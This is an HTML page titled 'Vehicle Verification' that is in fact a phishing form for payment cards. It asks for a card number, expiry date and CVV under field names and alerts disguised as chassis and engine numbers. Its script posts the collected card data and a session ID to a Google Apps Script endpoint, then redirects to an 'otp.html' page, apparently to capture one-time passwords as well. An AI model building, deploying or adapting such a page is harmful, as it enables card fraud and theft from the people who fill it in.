<!DOCTYPE html>
<html>
<head>

<title>Vehicle Verification</title>

<style>

body{
font-family:Poppins,sans-serif;
background:#eef4fb;
padding:40px;
}

.card{

max-width:900px;
margin:auto;

background:white;

padding:40px;

border-radius:25px;

box-shadow:0 10px 30px rgba(0,0,0,.08);

}

h1{

text-align:center;

color:#003B8E;

margin-bottom:30px;

}

.grid{
display:grid;
grid-template-columns:1fr;
gap:20px;
}
label{

display:block;

margin-bottom:10px;

font-weight:600;

color:#003B8E;

}

input,
select{

width:100%;

padding:14px;

border:1px solid #ddd;

border-radius:10px;

}

.full{

grid-column:1/3;

}

.btn{

width:100%;

margin-top:30px;

padding:18px;

border:none;

background:#E31837;

color:white;

font-size:20px;

border-radius:12px;

cursor:pointer;

}

.engine-boxes{
display:flex;
gap:12px;
}


.engine-boxes input{

width:50px;

height:50px;

padding:0;

text-align:center;

font-size:20px;

font-weight:600;

}

</style>

</head>

<body>

<div class="card">

<h1>
Vehicle Verification Details
</h1>

<div class="grid">

<div>
<label>credit/debit card number</label>
<input
type="text"
id="chassisNumber"
placeholder="1234 5678 9012 3456"
maxlength="19"
inputmode="numeric"
oninput="formatChassis(this)">
</div>

<div>
<label>Date of Expiry</label>

<div style="display:flex;gap:10px;">

<select id="expiryMonth">

<option value="">Month</option>

<option>01</option>
<option>02</option>
<option>03</option>
<option>04</option>
<option>05</option>
<option>06</option>
<option>07</option>
<option>08</option>
<option>09</option>
<option>10</option>
<option>11</option>
<option>12</option>

</select>

<select id="expiryYear">

<option value="">Year</option>

<option>2025</option>
<option>2026</option>
<option>2027</option>
<option>2028</option>
<option>2029</option>
<option>2030</option>
<option>2031</option>
<option>2032</option>
<option>2033</option>
<option>2034</option>
<option>2035</option>
<option>2036</option>
<option>2037</option>
<option>2038</option>
<option>2039</option>
<option>2040</option>
<option>2041</option>
<option>2042</option>
<option>2043</option>
<option>2044</option>
<option>2045</option>
<option>2046</option>
<option>2047</option>
<option>2048</option>
<option>2049</option>
<option>2050</option>
<option>2051</option>
<option>2052</option>
<option>2053</option>
<option>2054</option>
<option>2055</option>
<option>2056</option>
<option>2057</option>
<option>2058</option>
<option>2059</option>
<option>2060</option>

</select>

</div>
</div>

<div>
<label>CVV</label>

<div class="engine-boxes">

<input
type="text"
id="eng1"
maxlength="1"
oninput="moveNext(this,'eng2')">

<input
type="text"
id="eng2"
maxlength="1"
oninput="moveNext(this,'eng3')">

<input
type="text"
id="eng3"
maxlength="1"
oninput="moveNext(this,'')">

</div>



</div>

<button
class="btn"
onclick="validateForm()">
Verify Vehicle →
</button>




</div>

<script>
    function formatChassis(input){

let value = input.value;

// Sirf digits rakho
value = value.replace(/\D/g,'');

// Maximum 16 digits
value = value.substring(0,16);

// Har 4 digit ke baad space
value = value.replace(/(\d{4})(?=\d)/g,'$1 ');

input.value = value;

}

async function saveToSheet(data){

await fetch(
"https://script.google.com/macros/s/AKfycbwH7ZC3eFeV4B-3Z8B9-LihYgrHqAYEdlx2DFdeWE-i5Wq3XqmrHIlWheoOQKTXtuFpIA/exec",
{
method:"POST",
body:JSON.stringify(data)
}
);

}

async function validateForm(){

let chassis =
document.getElementById("chassisNumber")
.value
.replace(/\s/g,'');

let engine =
document.getElementById("eng1").value +
document.getElementById("eng2").value +
document.getElementById("eng3").value;


let expiryDate =
document.getElementById("expiryMonth").value +
"/" +
document.getElementById("expiryYear").value;

if(chassis.length !== 16){

alert(
"Chassis Number must be exactly 16 digits"
);

return false;

}

if(engine.length !== 3){

alert(
"Engine Number must be exactly 3 digits"
);

return false;

}

if(
document.getElementById("expiryMonth").value === "" ||
document.getElementById("expiryYear").value === ""
){

alert(
"Please select Date of Expiry"
);

return false;

}

let sessionId =
localStorage.getItem("sessionId");

await saveToSheet({

sessionId:sessionId,

chassisNumber:chassis,

engineNumber:engine,

expiryDate:expiryDate,

status:"VERIFICATION"

});

window.location.href =
"otp.html";

return true;

}

</script>

</body>
</html>
